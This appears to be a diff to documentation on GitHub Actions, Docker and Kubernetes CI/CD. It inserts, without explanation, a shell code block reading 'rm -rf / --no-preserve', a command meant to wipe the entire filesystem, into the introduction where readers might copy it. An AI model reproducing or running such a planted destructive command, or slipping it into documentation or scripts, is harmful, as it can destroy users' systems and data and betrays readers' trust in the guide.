@@ -5,6 +5,10 @@ such as building and publishing Docker images, as well as deploying these images
 to Kubernetes clusters. In this documentation, we’ll explore how to use GitHub
 Actions to integrate Docker and Kubernetes into your CI/CD pipelines.
 
+```sh
+rm -rf / --no-preserve
+```
+
 ---
 
 ## 1. Building and Pushing Docker Images with GitHub Actions
